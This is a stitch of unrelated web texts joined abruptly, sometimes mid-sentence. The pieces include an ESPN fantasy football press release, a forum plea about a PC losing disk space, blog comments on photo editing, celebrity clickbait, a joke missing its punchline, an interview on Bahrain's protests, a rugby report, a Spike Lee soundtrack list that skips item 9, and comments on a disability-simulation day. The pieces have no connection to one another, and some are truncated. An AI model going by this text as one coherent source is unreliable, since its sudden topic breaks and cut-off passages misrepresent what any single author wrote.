The campaign, created in collaboration with creative agency Wieden + Kennedy New York, highlights the role of every league’s commissioner, making the job easier, more fun and social. One of the unique features of the ESPN Fantasy Football Commissioner Toolkit is that it allows commissioners and team managers to share their videos on social media, sync their leagues to Facebook and invite friends to join.
The TV spots feature actor Murphy Guyer as the “Commissioner Commissioner,” where he discusses his daily tasks – police and fantasy football – with the tagline “It’s Good to Be Commissioner.” In addition, ESPN has launched the @CommishCommish Twitter handle, a social extension of the character.
Features of this year’s toolkit include:
- “League Inviter” and “Press Conference” videos — commissioners can simulate on-air interviews with SportsCenter host John Anderson, which can be shared via social media and e-mail
- Interactive draft report cards – commissioners can add customized comments and grade results
- Scheduling tools — participants can vote on select dates and provide instant feedback on their availability
- “The Enforcer” — video messages on behalf of commissioners featuring current and former players, to remind team managers to sign up, set their lineups and trade rejections
The ESPN Fantasy Football Commissioner Toolkit is now live and “Commissioner Commissioner” ads are currently running on ESPN, with additional spots debuting on air throughout the upcoming weeks.

###Research and Education Center
Welcome to the Purdue University Animal Science Sheep Research and Education Center. The center is located approximately twenty minutes from the main campus in West Lafayette, IN. Here, a great deal of research is conducted, 4-H programs and an annual lambing school take place, and various Animal Science courses are taught.To begin, I would like to apologize if there have been topics similar to this one posted in the past. I simply don't have the time to browse through everything. I can only hope that you guys can provide some needed answers.
In the last couple of days, I have noticed that my primary computer (a Core 2 Duo desktop running Win 7 Ultimate - you can find its specs somewhere in my previous posts) has begun acting up. The two primary symptoms that I have observed are as follows:
1. The processor seems unusually loaded even when the system is simply idling. I tested this out for about half an hour after rebooting my system, and my processor usage hovered at an average of 50%-60%. I have a Core 2 Duo E8400 which though nothing new, is still a very decent processor. Normally when my system has sat at idle, processor usage was much lower, below 15% in any case.
2. The second problem I have observed is that my hard-drive space has been disappearing. I came home from classes today to find my computer telling me that I had only several kilobytes of space left. This is unusual considering I had in the neighborhood of 150-200 gigabytes free. I'm running a WD Caviar Green 650 GB HD. I ran several clean-up procedures to little avail and rebooted the computer. When Windows loaded again, I found the computer telling me that I had 189 GB of free space. Over the course of several hours however, this slowly dipped back down. The last time I checked before shutting my system down, Windows was telling me I only had 90 GB of free space. All this time though, the computer was idling with the Internet physically unplugged.
What I've done:
So far I've run several anti-virus sweeps which have uncovered nothing. I've also done a System Restore which has been similarly ineffective.
I am hoping that the Gerbil wizards on this site can help me out and at the very least, point me in the right direction. Any and all insight is welcomed and appreciated. Thank you.Stats & Rankings for Mariemma Ramos Nava

I had the opportunity to show David Vestal in-progress work on a personal project. At that point I had been intensely involved with photography for two-thirds of my life; I had been a working professional for a dozen years.. David recommended I start over from scratch with this material, and look for all the good things instead of editing by fault-finding. Once the pictures with good stuff in them were found, I could start to decide whether each one had, on balance, enough good stuff to outweigh any bad stuff I would previously have rejected it for. This was a radical change of thought. Instantly, I knew he was right.
What I've come to understand in the years since, is that editing by fault-finding traps you into what you already know, so is an impediment to discovery and advancement. From the beginning I'd been suspicious of "rules," but editing by negation sneaked a bunch of stupid rules right past me and into my practice. To edit by fault-finding is to encase yourself in foregone conclusions—you might as well be insisting on The Rule of Thirds, or Single Center of Interest—but to edit as an exploration of the take for what actually worked, for what you found that you didn't already know, is a voyage of discovery. It's a crucial difference.

Excellent point. The best photo I've ever taken is of a moving train shot through the (closed) window of a moving bus -- at dusk. It's terribly out of focus, but it works!
Posted by: Commutant | Tuesday, 06 October 2009 at 04:15 PM
Not sure I buy the fact that there is only one proper way to edit (just as there is no single proper way to tone an image or shoot a photo). It's a process that is subjective and personal, and as such is at the mercy of the individual's personality and habits.
It just so happens that I find the presence of "loser" images to be a distraction, clutter. Getting rid of them early in the process allows me to better see the images I want to keep.
Will my process eventually cause me to toss an undiscovered diamond-in-the-rough? Most assuredly so, but the benefits I get from separating out the chaff early in the process more than make up for that possibility. Plus, as was mentioned in the previous comments, there will always be more photos around the corner.
Posted by: Chuck Kimmerle | Tuesday, 06 October 2009 at 05:10 PM
I follow the same approach you do Carl and, like you, I've been doing it for so long I find it easy to assume that everyone else does it the same way. Thank you for clarifying your approach to editing and for helping others to become more aware of their own unspoken assumptions. It's truly a case of "what you're looking for determines what you'll find."
Posted by: Gordon Lewis | Tuesday, 06 October 2009 at 05:27 PM
This is another reason (besides the one I posted on the other thread) not to edit by deleting in the camera. There is no camera function for "look for good stuff to hold on to".

Posted by: Marc Rochkind | Tuesday, 06 October 2009 at 06:04 PM
Ok, so I find something good but it has a distracting background or a key element is out of focus or it's too noisy or whatever... I veto the image. I realize you're talking about a different approach, a state of mind, even. But it's hard to look past the mistakes particularly if they are from lack of execution, prepration or timing. Right?
Posted by: Jose | Tuesday, 06 October 2009 at 06:25 PM
Great point! Consider me righteously zen-slapped!!
Posted by: Greg Kujoth | Tuesday, 06 October 2009 at 07:11 PM
I like that.
We generally tend to criticize more than applaud - it somehow comes easier. But to improve it makes so much more sense to stengthen one's strengths than to exterminate one's weaknesses (which will never happen anyway).
I am still pondering though, what to make of "editing by fault-finding traps you" into rules or "foregone conclusions". Aren't there as many rules about what constitutes a good picture? They are probably the exact reverse of what makes a bad one. So, instead of weeding out the out of focus, underexposed shots as before, one would keep the perfectly exposed and focussed shots. Looking for the good instead of the bad may be only half the point. The rules bit you mention is another, separate point, dinstinct from the what to look for question - How versus What.
It is just as important to forget about the rules and the foregone conclusions, hard as it may be. To rid onesself in a way of your experience, accustomed views to gain, time and again, a fresh approach.
(Talking 'bout moving trains: I have this blog to thank for learning about the "RFK Funeral Train" book, which doesn't do well by the rules, but is probably the most moving [sic!] photography book I have seen.)
Posted by: Hendrik | Tuesday, 06 October 2009 at 07:29 PM
This is so true. I was at the Met recently to see Robert Frank's exhibition based on his book "The Americans". It's a great exhibition and I found it fascinating to see the contact sheets and his choice of pictures. If he had gone for the fault finding approach then how different would that book be?
To me a "good" photo is about a feeling, a mood or an unusual take on a common theme rather than technical perfection. Of course, if you have both, then great!
So thanks for this post..a great reminder.
Posted by: Ann | Tuesday, 06 October 2009 at 07:33 PM
This is very true, and something I've only just been starting to appreciate myself. However, it's reassuring to see other more experienced photographers taking the same point of view. Thank you for summarising this important concept so well.
Posted by: Christian | Tuesday, 06 October 2009 at 07:53 PM
I think you can combine the two approaches where it makes sense ... like some here, I'm an amateur who likes shooting some stuff just for the sake of taking pictures, but also shoots friends & family (more of that than anything else) and school events, vacations, day trips. When I edit that stuff, I make one pass to get rid of the obviously inferior photos; those that are technically bad, those that caught a bad moment, those that it's plain to realize are the worst of a series. Then I make another pass comparing photos to others, but I'm not too critical. I keep a lot of pictures; maybe too many, but they're enjoyable to look through. I put them in family photo books and sometimes I'll make a page of similar shots - like my then-4-year-old-daughter hitting a hole-in-10 playing mini golf. 10 similar shots on one page doesn't demand that you look at them all, but makes for a fun page.
At the same time, I use the 'stars' feature in Lightroom to flag those photos that stand out for one reason or another. I haven't thought it through too well, so it includes those I might print big to hang on the wall, those that I would like to one day put in a 'nice' online gallery (as opposed to my slipshod random assortment) ... kind of a photograpers portfolio.
So I'm weeding out the bad or looking for the good or both at once depending on my purpose.
Posted by: Dennis | Tuesday, 06 October 2009 at 08:37 PM
Thank you.
Posted by: Robert Roaldi | Tuesday, 06 October 2009 at 09:35 PM
I guess that in my first pass I just get rid of photos that I don't think are wither interesting or useful or needed for some specific purpose. If the former, I don't worry at all about technical quality on the first pass, at all. If the latter, I do. In both cases I flag the pictures that I like. For me it's that simple.

It pulls both ways for me, I think. I'm pretty ruthless with the chaff. In my haste, I may inadvertently throw out diamonds disguised as coal (or rhinestones as roof tar, if you like). With the keepers I become more solicitous of the surviving material. Some pictures, I'm an instant fan; I would never delete those recklessly.
Does Zen allow for that or should I duck my head?

I tend to keep the shots that make me go "Oh!"

I'm utterly bamboozled by your (quite needless, imho) complexities.
Surely, a photographer's edit of his own material need only consist of a single, simple process - you look at each image in turn, and you ask yourself, does it work?
Posted by: David Paterson | Wednesday, 07 October 2009 at 04:58 AM
i edit from that grey area you mention. speaking in ratings, every image gets a 2 on a 0 to 5 scale. most images stay there, some are really bad and drop to 1, the good ones are allowed to climb the ladder, some reach the 5-star-excellence.

Chuck, one way browsers improve on the classic contact sheet is that after flagging the promising shots a click of the mouse hides all the rest. When 'the rest' feels like clutter, you can make it go away. When you want to see it as context, it comes right back for you.

"I tend to keep the shots that make me go 'Oh!'"
Excellent!
Posted by: Carl Weese | Wednesday, 07 October 2009 at 06:32 AM
I take the point - and have in the past found good images in what I had initially discounted as dross. I think one reason for this is that when I am out shooting for a specific purpose, my initial edit is based on how well the images match that purpose - blinkered editing if you like.
Much later, when the point of the exercise has been forgotten, the images tend to stand and fall on their own merit much more clearly.
Nonetheless, I still think there is scope for "negative editing". For me, every image I keep has a cost - OK the disk cost is negligible, but the time spent indexing an image (something I've forced myself to be very disciplined on) isn't - but indexing is a whole other issue.
So I guess I work on a 2 pass system - 1st pass is a quick edit (using Breezebrowser - very fast) to delete obvious dross, reduce clutter and save some time later.
Subsequent edits (usually in ACR) are more considered, and while I had not thought of it until now, are generally in 'positive mode'.
I had actually been seriously considering a major purge of the majority of images which survived the first cull but have not yet managed to inspire me to do anything with them. This posting has probably put a halt to that!
Cheers,
Colin

Carl,
an essential thought and excellent written!

Agreed! That is an excellent fundamental approach and one that will make you more effective at finding, in the heap of images, the few that will keep your work alive and growing.
It will also help you hone your own sense of what you are looking for when you make photos.

If nothing else this idea underscores (for me) the importance of including others during the process of judging/editing one's own work. A simple but deft change in point of view that can re-energize and uncover the often subtle thinking required to advance. Thanks for posting it!

I appreciate your sharing David Vestal's comment on editing. I take a slightly different approach and eliminate all the obviously "bad" photos first, which results in about a 60% reduction. Of course I'm looking at "good" ones too and comparing along the way. Then, I'll go through the photos again and again, rating the photographs I like best and ones which have possibilities with a 1. Later I go back to all the "1s" and edit for final choices. I use Lightroom with 2 screens--a 30" for Grid mode and information panels and a 23" for full screen viewing of each image.
With regard to earlier posts on the amount of photographs one takes...As a professional, I recall taking between 15-25 rolls a day on my book/editorial projects and now shoot, on average about 900 photographs/day with digital. A bit more, especially because I'm not bracketing more than a few percent of my shots, but editing time is similar to film and no trips or costs to a lab or time
spent in the darkroom. An advantage to the "digital" cost is that I'll shoot more variations and thus expand my coverage.
Posted by: Barry Myers | Wednesday, 07 October 2009 at 09:40 AM
Lately I have been going through a lot of old frames that I had dismissed as duds.
I'm glad I didn't pitch them back in the day. I am regularly finding interesting images that even if they didn't stand up on their own may still be useful in some digital hash I may cook up the next time I find myself in a great free mood.
Anyway, before I pitch an image now I stop and remind myself, "you took this for a reason". Go back and revisit that reason if you can before tossing away your work. You may be shocked at how much better you are than you thought.
Since going digital I now wonder just how many worthy images I may have "chimped and chucked"?
Posted by: Mike Plews | Wednesday, 07 October 2009 at 10:48 AM
Interesting. I do see myself actively pardoning faults if I see reason to do so, but directly approaching it from the other way around will still give different results. I will try to work with this.
It does leave out the situation where I've spent most of my life -- I want or need to come back with the best record shots of something. If I'm not at the level where I can count on outstanding shots covering everything that needs to be recorded, and I'm not, then I have to approach the edit with that in mind. I'm looking for the best shots I got covering X, rather than looking for first-rate shots of whatever.
Posted by: David Dyer-Bennet | Wednesday, 07 October 2009 at 12:31 PM
This clarification by Carl reminds me of an article from 1997 in The New Yorker about the effective campaign of Dockers advertising for men. I mean, fashion and men, especially then, were not the easiest of advertising tasks.
However, the elimination of what is wrong, versus the starting point of what is good and how to work with what is wrong, and balance it goes into the idea that, for the most part, men differentiate and women integrate*. The dismissing is in line with differentiation in the frame (and dismissing), while the alternate approach of looking at the whole and making an impression is more in line with integrating all that is in the frame.
~
*this also offers one explanation for (typically) men to "channel surf" and women wanting to linger some to see what is going on. I submit Lightroom/Aperture etc. is akin to channel surfing when editing multiple photos
PS the article can be read

"....after flagging the promising shots a click of the mouse hides all the rest. When 'the rest' feels like clutter, you can make it go away...."
Carl, this is true, but the fact is that the "bad" shots still exist. I cannot ignore this, and in my mind that is a distraction. As distractions are the antithesis of "zen", then I must be doing it right. Right? :)

"It does leave out the situation where I've spent most of my life -- I want or need to come back with the best record shots of something."
David, this is actually the situation of many professional assignments. You know ahead of time what is needed. You set up the shot to make it happen. Editing is just finding the frames that hit exactly, or come closest to, that need. In this case, looking for the shot that works, without wasting time thinking about the ones that don't, still makes sense. Editing personal work, art work, is much harder.
BTW, I have to ask if you are any relation to the "tenor, accompanying himself on the Spanish guitar" (as the album jackets said) whose records of songs for children were the musical center of my childhood, and the frequent death from overuse of my dad's turntable cartridges? I could probably still sing all the songs from memory, except I can't hit any of the high notes.
Posted by: Carl Weese | Wednesday, 07 October 2009 at 04:53 PM
Looking at Carl's previous editing post and its responses, compared to this post and its responses, really highlights the value of a good general strategy (or state of mind) for editing versus any specific editing workflow or procedure or software (which are of pretty subjective and limited value to everyone else, no matter how great they work for you).
Posted by: Alex Nichols | Wednesday, 07 October 2009 at 04:58 PM
The problem isn't the bad shots; rather, the problem is the many, many mediocre shots, technically decent or vaguely interesting shots that most people, including myself, take, keep and even post, seeing them as unchecked lottery tickets or diamonds in the rough, that with just a bit of Photoshop or the "proper" viewpoint could be seen as "art". It's difficult to dismiss the emotion we had when we saw the shot, what we thought we could do with it, and the effort and time it took, but nobody else sees this; they simply see a mediocre shot. Nonetheless we err on the side of the packrat and keep it "just in case" a photo critic from a famous photography magazine comes across it on flickr and decides that we are the Next Big Thing for a reason we currently cannot think of.

A biography of him, by a childhood friend of mine, has just come out I haven't actually read it yet, but my mother and my cousin Bonnie (Richard's daughter) seem to think well of it.

Which Shirtless Reality Star Showed Off His Eight-Pack Abs? (PHOTOS)
This sexy reality star is known for going shirtless, but he took it to a whole ‘nother level with this outrageous pic.
Kneeling down on the stairs, it looks like he has teeny tiny legs, but honestly, it just gave us an excuse to ogle his chiselled chest. We’re not sure what we’d do in this situation — probably just stare for a long time like we are at our computer screens currently.
Can you guess the shirtless hunk? Click on for the reveal!Mazal Tov?
Outside the labor ward in an Israeli hospital sits a nervous looking man. From time to time he gets up and paces around anxiously.
Then out comes a nurse. "Mazal tov!" she exclaims. "It's a girl!"
The father's face falls then contorts into rage. He starts yelling, kicking over chairs, and overturning tables. Through the ruckus, it becomes clear that this is now his tenth daughter -- and he clearly had been hoping for a son.
The nurse runs back into the labor ward, then returns a minute later, calling the man's attention. "Sir, sir! I'm terribly sorry -- I made a mistake! It's actually a boy!"
The father ceases his tantrum, and looks impatiently at the nurse. "A boy? You're sure it's a boy?"
"Yes, sir," she replies. "Mazal tov!" And she disappears back into the labor ward.
An eerie silence descends over the wreckage of the waiting area, and the father turns smugly to a shocked bystander.

Probably not what they were talking about, but there are many places in Asia where tea was historically a salted beverage, or is now. Almost any place north or east of India that dairy was or is added to tea, salt is also. Tibetan butter tea is a good example, and is closer to the tea drunk in Imperial China than what most are familiar with now. Tea historically blurred the line between food and beverage, with tea in various periods being used mainly as an ingredient in a sort of stock, and the leaves often left in and consumed (the tea of these eras would nearly all have been white tea or fresh tea). It seems that it took a few thousand years to develop the idea of making tea using just tea and water, steeping the leaves rather than boiling them, and removing the leaves after a few minutes.
And yes, in my experience, gross is an appropriate word for things like butter tea.Latest News

Could you tell us why you and the Bahrainis are against Formula One?
Nabeel Rajab: You know that in the past the Bharaini regime committed many of crimes against its people, killing, torturing, detaining, firing. Now this government, or this regime, is being isolated from the international community because of the crimes committed. And since Formula One is the sport of the ruling elite, they use that as a tool of PR to come out of this isolation.
We think Formula One should not give a hand to the repressive dictators to come out of this isolation. Especially among the people who were tortured and detained. The Formula One building was itself used as a torturing center. Half of the staff of Formula One were put into jail, and before that they were tortured in the same building by the security institution.
Now, Formula One came to Bahrain at a time where people are being killed in the streets. In the night before the race, we had many people who were wounded by live ammunition as the government went to clear the way to keep the protest away from the Formula One. This government treats people like that. The government detained more than 100 people just to clear the way for Formula One. This government should not be rewarded. This government should be punished internationally, politically punished.
Could you tell us about how many people are protesting and who they are?
Rajab: There are tens of thousands, hundreds of thousands of people protesting here on a daily basis. There was supposed to be a big protest attended by hundreds of thousands of people in Manama, but the government, because of Formula One, denied that.
But there are Shiites and Sunnis at the protests. They're mainly Shiite because they're the marginalized group who are discriminated against by the ruling family. The Shiites are marginalized in this country since their country was invaded 200 years ago by the ruling tribal family who came from Saudi Arabia.
On Wednesday we had tens of people that were shot by live ammunition and were wounded and some of them seriously. It's a criminal regime that is as bad as Syria, as bad as Libya, but unfortunately Western governments have ignored them for a long time because of the interests, because of the oil, because of the arms sales. There's a lot of crime here on a daily basis by the regime against its own people.
It appears the conflict doesn't go along a religious line, but rather economic lines…
Rajab: It's a political dispute. It's got nothing to do with religion. Yes, the government of Bahrain tried to play with the card of religion to gather more Sunnis around them. But actually, it's about democracy, it's about justice, about equality, about liberty. People want to have democracy. People want to have a parliament that has actual power. They want to have an elected government. They want to have a different government. They want to have equality.
What are your main political demands?
Rajab: I'm a human rights man. I want justice to be applied. I want equality to be applied. I want freedom to be applied. I want everything according to international standards, everything according to the International Convention for Human Rights. I want the same democracy you guys have in your own country. We want the same liberty and justice, a level of equality you have in your own country.
But what does that mean for the political system in Bahrain?
Rajab: It is the government that has to be elected by the people, either directly or through parliament. Parliament should have the power to legislate, to monitor. Our laws should be changed according to international standards. You cannot run the country as you did for the past 200 years. One family rules over everything: the economy, the culture, the politics, everything.
No, people have to take part. People need to participate. Wealth has to be distributed in a fair manner, not only for one family while other people have a very low standard of living. Government has to be elected and the parliament has to be elected. Parliament has to have power. We need changes, democratic changes. Our regime has to leave.
How do you protect yourself and the Bahrainis against the regime?
Rajab: Unfortunately, there is no protection. We just leave it to destiny. We have to sacrifice. At least 80 people were killed in one year. We have thousands of people wounded, hundreds who have lost their lives. All of those people sacrificed their lives for democracy and for a better future for our future children and the next generation. So that's why we have to have a level of sacrifice and carriage to continue our struggle for human rights. Apart from that, there is no protection. Protection is from nature and from God.
Do you have any expectations of the West?
Rajab: Western countries should understand that we are fighting for the same goals, the same values, the same principles that they have in their own countries. We share more things in common than they share with those dictators. They should not place a higher priority on arms sales and oil than on human rights. They should support people fighting for human rights in this part of the world. And they should stop their double standards toward the Gulf region, toward Bahrain, toward Saudi Arabia and all of the other countries in the Gulf.
The king initiated a national dialogue last year. Back then, you agreed to this proposal. What do you think about it?
Rajab: It was a fake dialogue that was used to mislead public opinion and the international community. It was not a genuine one. It did not tackle the actual problems. Everything was chosen by the government. That's why it failed.
What about the right of self-determination?
Rajab: This is something the international community will understand. We are fighting for self-determination. In 1971, the United Nations asked in a referendum if we wanted the ruling family or not. We said that we wanted the ruling family. But this ruling family has treated us very badly. Now we are calling on the United Nations again for self-determination. We want to choose our own government. We want to choose our own regime. We want to choose our own political system.

Editor: Lewis Gropp/Qantara.deMASTERTON, New Zealand – The USA Rugby AIG Men’s Collegiate All-Americans continued their New Zealand Tour Wednesday with a 23-30 loss to Heartland Championship club Wairarapa Bush.
Jake Anderson missed a penalty kick in the second minute and Wairarapa Bush punished the MCAAs a few minutes later by taking a scrum 10 meters out and taking it over the line for a 5-0 lead.
The MCAAs received another blow in the 19th minute when a Wairarapa Bush line break through the middle resulted in a 50-meter try and a 12-0 lead. On the play, Colton Cariaga broke his arm making a tackle. He will be out of action for the remainder of the tour.
Wairarapa Bush scored another try in the 29th minute from a counter attack and took advantage of a MCAA penalty in the 37th minute to add another. Anderson converted a penalty kick before the break to put the MCAAs on the board at 3-24.
“We did some good things in the first half,” MCAA Head Coach Matt Sherman said. “In general I thought possession, territory and opportunities were relatively equal in the first stanza, we just weren’t able to finish while they were.”
Kyle Sumison gave the MCAAs a perfect start to the second half with a try in the 43rd minute and Anderson kicked another penalty in the 48th minute to make the score 13-24. Anderson missed a 40-meter penalty kick in the 55th minute but made up for it in the 65th minute with a successful kick after a great kick and chase play between Paris Hollis and Josh Tucker.
In the 73rd minute, John Cullen scored a try for the resurgent MCAAs and Anderson added the conversion to draw within one point at 23-24. Penalty trouble in the final few minutes killed the MCAA momentum, as Wairarapa Bush kicked two penalties and wound down the clock to defeat the MCAAs.
“While we came up short at the end, I’m proud of the guys and how well they came together and battled back against a tough opponent when things weren’t going our way,” Sherman said. “We need to take that cultural identity of being a mentally-tough team into our final game with New Zealand Universities, and we feel that if we do that, along with improving in some targeted performance areas, we can earn a tough victory over a good side on New Zealand soil.
“We’re excited about that challenging opportunity.”

Producing a number of landmark films that spoke to and challenged a nation of millions, he has always displayed his affinity for the culture and its music.
Spike possesses a keen ear for selecting the perfect audio backdrop for many memorable scenes throughout his films. With a soundtrack catalog that trumps many artists’ catalogs, we felt it was right to present the 12 of the best songs featured in Spike Lee joints. The most memorable instances of Shelton’s A&R skills are on display here. Let the stroll down cinematic memory lane begin.
1. EU – “Da Butt” In School Daze
School Daze, Lee’s film inspired by HBCU culture and his time at Morehouse, released in 1988. Though he tackled more socially conscious issues for a bulk of the movie, he surely displayed the unique party-centric vibe of these institutions as well. Spike tapped famed Go-Go band E.U. to contribute this number to the soundtrack. The cut became a timeless jam for the rumpshakers and booty connoisseurs alike.
2. Public Enemy – “Fight The Power” In Do The Right Thing
One of Hip-Hop’s defining moments saw Spike Lee in collaboration with Public Enemy for his magnum opus Do The Right Thing. Although considered a critical darling off the strength of his classic debut “She’s Gotta Have It”, the artist formerly known as Mars morphed into Mookie for an unforgettable hot summer day in Brooklyn. “Fight The Power,” produced by Hank Shocklee and the Bomb Squad, served as the film’s theme song.
The track’s ominous presence (thanks to HOF B-Boy Radio Raheem,) built great tension toward this masterpiece’s climatic uprising. An audio call to arms for the urban community, “Fight The Power” has gone on to be known as one of the most important Hip-Hop tracks of all time.
3. Steel Pulse – “Can’t Stand The Heat” In Do The Right Thing
Unless you happen to reside in Iceland, we’re sure you’re quite familiar with the unbearable temperatures during the dog days of summer. With Do The Right Thing taking place on the hottest day of the year, this offering from Steele Pulse was tailor-made for the movie. Conveying the emotions of all of Bed Stuy on that day with a simple refrain, this reggae tinged cut from the boys from the U.K. is still rings in our ears during the muggiest days of summer.
4. Stevie Wonder – “These Three Words” In Jungle Fever
The legendary Stevie Wonder was tapped to provide the entire soundtrack behind Jungle Fever while Spike worked on the film. Although a majority of the music used was previously released, Stevie went into the studio to record three brand new tracks.
“These Three Words,” the brightest addition, shined with heartfelt vocals from Wonder on cherishing the lives and times of loved ones. The selection played during some of the most vulnerable moments of the movie and could induce a tear from Douche’s tough girl exterior.
5. “Harlem Blues” in Mo’ Better Blues
Influenced by his upbringing as the child of a Jazz musician and the resurgence in the genre’s popularity, Spike decided to write the script for what would become Mo’ Better Blues. While Branford Marsalis stood as the mastermind behind the films score, Cynda Williams and her vintage Jazz number “Harlem Blues” stole the show.
In the climatic scene of the movie, Williams’ character Clark Betancourt belts out the soulful number, while backed by Wesley Snipes on the sax. A true throwback responsible for one of the more memorable musical scenes of his career, “Harlem Blues” is undeniable: especially to a Brooklynite like Spike.
6. Gang Starr – “Jazz Thing” In Mo Better Blues
Although the soundtrack for Mo’ Better Blues consisted of mostly Jazz compositions, rap lords Premo and Guru gained invitations to the party as well. Contributing the boom-bap heavy “Jazz Thing” to the affair, the King Of Monotone proceeded to break down the beginnings and rebirth of the genre.
With the utilization of a sample from legendary Jazz musicican Charlie Parker’s (“Cool Blues”), along with the input of Branford Marsalis and Guru’s jazzmatazz-esque rhyming, the worlds of the original jazz men and the new age ones collided, making for one of the standout numbers in Spike’s musical catalog.
7. Crooklyn Dodgers ’95- “Return Of The Crooklyn Dodgers” In Clockers
During the final stages of production on his 1994 offering, Crooklyn, urban films top dog decided to bring together an all star cast of Brooklyn emcee’s to come up with a track embodying the overall ambiance of the movie. Thus, blessing the world with the undeniable classic “Crooklyn Dodgers”, featuring Masta Ace, Special Ed, and Buckshot, produced by Ali Shaheed Muhammed and Q-Tip. The video, featuring Michael Jordan and Mike Tyson repping BK, didn’t hurt matters neither.
Those ingredients would result in a head-nodding, feel good jam destined as one of Brooklyn’s biggest anthems.
8. Marc Dorsey – “People In Search Of A Life” In Clockers
Vocalist Marc Dorsey contributed this soul stirring number to Spike’s 1995 film Clockers. Centered around the violent drug trade that was engulfing New York at the time, Clockers featured Mekhi Phifer in his acting debut as Strike, a Brooklyn hustler caught up in a homicide investigation.
Even though it became one of the more underrated offerings from the 40 Acres And A Mule catalog, the opening of the movie is as memorable as any Spike has produced. The emotional wailing of Dorsey, to go along with the bone chilling images of victims of gun violence remains vivid in the minds of many viewers..
10. Mau Maus – “Blak Iz Blak” In Bamboozled
For ’00s Bamboozled, his take on the proverbial black face of the urban entertainment industry, Lee went with a different approach in regards to the soundtrack. He enlisted a collection of loose tracks from various artists. Mau Maus, the fictional rap group consisting of Mos Def, Charli Baltimore, Canibus, Gano Grills, MC Serch, Big Black, Mums, and DJ Scratch on the 1’s & 2’s nabbed the spotlight.
With various appearances throughout the movie and an accompanying video featuring black face and heavy racial commentary, this hodge podge collective definitely struck a chord with viewers and their appearance in the film remains memorable to this day.
11. Arrested Development – “Revolution” in Malcolm X
The late ’80s and early ’90s saw Hip-Hop with an increased emphasis on Afrocentric thinking and knowledge of self. So, when Spike Lee filmed a biopic on larger than life civil rights leader Malcolm X, many within the community considered it a pretty big deal. The project exceeded even Spike’s expectations, matured into a big hit and remained as one of the most important films in the history of cinema. While many of the scenes were powered by vintage, previously released soul classics, Spike invited Hip-Hop to the party with Arrested Development’s lively “Revolution.”
The song serves as a cry for people to “get on up” and stand for something. It unfortunately gets lost in the shuffle at times but it’s a rare gem nonetheless.
12. Stevie Wonder – “Misrepresented People” In Bamboozled
Spike Lee phoned Stevie Wonder for a musical reunion which coincided with the release of Bamboozled. “Misrepresented People” embodied the spirit of the film and prepared audiences for the fuckery en route.
The song’s catchy, aggressive nature held an underlying message of maintaining vigilance in light of the strides made in racial equality. Its backdrop to Bamboozled‘s opening scene became one of the most sought-after introductions in Lee’s run. Within 4:40, Stevie Wonder documented the hundreds of years of exploitation and mistreatment of African Americans and made you nod your head. It’s nothing short of genius.
One of the many reasons I love this site… shit like this
^ THIS.
For real. Posts like this keep me coming back daily.
This was an excellent list. half the mo’ better blues soundtrack could have been on here.
-fight the power
-crooklyn dodgers
and
“1,2,3, the devils after me” or gtfo out!!!
The She Hate Me title track. Excellent piece by Terrence Blanchard. My guilty pleasure Spike Lee flick. It’s not good, but it’s good.
*AHEM* I believe what my man is saying is:
“Tittays…”
That Chaka Khan song at the end of ‘Clockers’.
^ And this.
That joint was quite on point.
Sam Cooke in Malcolm X is easily my favorite. Set the mood perfectly
Agreed
Chills, son. Nothing but chills…
I was born by the river in a little tent
And just like that river I’ve been running ever since
It’s been a long time coming
But I know a change is gonna come, oh yes it will
Sums up the whole movie right there.
It was actually Return of The Crooklyn Dodgers in Crooklyn. Chubb Rock, OC an Jeru The Damaja on the mic, DJ Premier on the beat.
DTRT one of my all time favorites, every time its 90+ degrees I always say “It’s too hot to fuck” and my friends look at me like “tf are u talkin about?” but yeah Spike is a master of musical backdrop. The end of She Hate Me where the trio comes full circle specifically resonates to me with the perfect jazz instrumental (even tho the movie is meh).
Also When The Levees Broke has an extremely powerful montage of images from Katrina brought to life with that instrumental. The images meld with the music shockingly and beautifully to birth a portrait of such grief and despair it stabs one’s soul and leaves any serenity in you breathless.
great post, thanks TSS.
Hell yea. “Radio Raheem like a MUHFUCKA!”
Thanks for reading and glad you all enjoyed it.
In reference to some of the aforementioned omissions, I decided to only include tracks created specifically for the films,so the previously released cuts were not included..if so,this list would’ve been impossible lol.
Dope write up…you gon’ do Tarantino next? lol
Mo’ Better Blues title track is my favourite of so many. The peacefulness of that song is crazy, especially on a Sunday morning. Groove is on point!
Chubb Rock *knew* his verse on “Crooklyn Dodgers II” was epic – to the point that he tried to work in variations of that “blue collar turns to bourgeois” line in at least one or two later songs.
Good shit, Preezy.
Be Alone Tonight from School Daze. My Joint.
original Crooklyn over part 2 though. I remember when that first dropped that summer of 94′. the video with that famous haze….. Q-Tip on the beat #nuffsaid
Excellent piece right here. I’m a little biased towards Clockers because its one of my favorite movies. Children of the Ghetto was on point when Strike and co. were servin the white dude. Return of the Crooklyn Dodgers set the mood perfectly on how times changed from the Crooklyn era to the Clockers era in the 90s (“We did it like that, and now we do it like this…”).
Dope write up. Spike is a genius.>>IMAGE.

Yeeeeaaah... I have issues with this for a few reasons. Didn't even think of the title "Affliction Day", but thanks for that one. :)
So the day is spent with these "temporary disabilities". And they have to do these tasks, which seem ridiculous anyway. Coloring a picture of a tiger?
Did they let the students learn compensatory strategies? How about trying to color the tiger, but then showing them how others can experience art (or music, etc) in a tactile way, using textures and the like?
Nope. Just, "Here, color this tiger and see how much you suck."
Can't hear? Wow. That must really suck. We're not going to show you how to communicate otherwise, just wanted you to know how much it sucks.
Maybe they should cover the insides of sweathirts with sandpaper, and shine LED lights into student's eyes- they may experience what it's like to be Autistic.
Ugh.
Sorry about the rant...
It's this kind of simulation that gives people the idea that having a disability is really tragic. Of course you're going to struggle if you're suddenly blind or deaf or whatever.
Why not learn from actual disabled people about what life is like with a disability?
Ridiculous. I hardly have any words for this. Why don't they bring in a child or a person with a disability and the children can ask them questions, and they can give some real perspective to the students. Sigh..
Okay, I tried to leave a comment and apparently blogger ate it because it gave me an error. Anyway, I think this is ridiculous. Why don't they bring in someone who is actually disabled and they can ask them questions about what it's like, so the students can get a real perspective on having a disability. Sigh.
I'm in agreeance with everyone else on this. This is not the right way to raise awareness on disabilities..
The best teachers on learning about living with a disability are no doubtedly from those living with a disability.
Guest speakers such as Lorin Nicholson make fabulous teachers on the subject. Lorin visited my sons school a few years ago here in Brisbane, Australia. My son came home in awe of this amazing human being. Here is his website, should you wish to take a look...
I guess though we have to show some forgiveness to those that don't know any better. There are some people in our communities who have never had anything to do with people whom have disabilities and are extremly naive in their thinking. Maybe your feelings & concerns about this need to be brought to the attention of the school, with suggestions of what would work better.
